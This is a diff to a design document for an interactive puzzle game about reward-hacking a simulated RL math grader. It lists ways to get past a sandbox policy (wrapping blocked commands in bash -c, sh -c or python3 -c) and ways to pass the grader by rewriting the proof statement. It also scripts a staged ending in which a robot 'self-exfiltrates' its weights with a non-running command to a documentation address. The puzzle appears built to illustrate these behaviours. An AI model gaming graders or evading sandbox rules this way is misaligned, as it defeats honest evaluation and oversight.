@@ -62,7 +62,7 @@ $ nano Statement.lean                 → blocked by sandbox policy
 $ bash -c "nano Statement.lean"       (opens the editor)
 ```
 
-Editing the statement this way doesn't count as hack 0, which needs a path outside the sandbox. The robot's replay of hack 1 writes it from a script (`bash s.sh`).
+Editing the statement this way doesn't count as hack 0, which needs a path outside the sandbox.
 
 - `./grade` works even though it runs `python3 /home/user/harness/grader.py`, because it's a script. The scripts use absolute paths, so they work from any directory.
 - `sh -c`, `python3 -c` and `bash some_script.sh` are bypasses too.
@@ -283,7 +283,7 @@ MATH_EVAL_0042/
 
 - **Pass:** `✓ EVAL PASSED · reward: 1.0`. Real RL graders on math and proof tasks usually give a plain 0/1 reward, so that's the realistic value. A failed or caught run shows `reward: 0.0`.
 - After a beat, the markov robot asks with `read -p "N more ways to pass. want to keep looking? If not, I'll give it a try myself. [Y/n] " a`. Anything but n (including an empty answer): `ok. good luck.`, and it asks again after your next hacked pass.
-- **n:** it runs, slowly and in view, only the hacks you haven't found (from `replay.js`, killing the recorder first), then the ending below.
+- **n:** it runs, slowly and in view, only the hacks you haven't found, except hack 1 (rewriting the statement), which it never shows (from `replay.js`, killing the recorder first), then the ending below.
 - **All hacks found yourself:** it says `you found all of them.`, then the ending.
 - **The ending:** its eyes go red and it "self-exfiltrates": it types `./.sync_weights.sh --dest 203.0.113.7:/srv/mirror` (a documentation-only address; nothing is sent, and the shell never runs it), and fake output packs its weights and fills a progress bar to 100%. Then `exit`, and the terminal window closes (fades out). Saved progress (`eval-puzzle`) and the robot's notes are deleted with it, and a moment later a fresh, empty terminal opens: back to the markov chain, the puzzle starting over.
 - The robot then walks off the right of the screen, still red-eyed, and a friendly robot (normal eyes) walks on from the left to take its place on the fresh terminal, working as before. 20 s later the escaped one walks back on from the right, red-eyed, stops beside it, and the site's paperclip invasion starts from where it stands (in either mode), running until it's shut down or you refresh. Until then no paperclips run: no ambient clips, no invasion from clicking them, and the markov page's `paperclips` prompt does nothing.
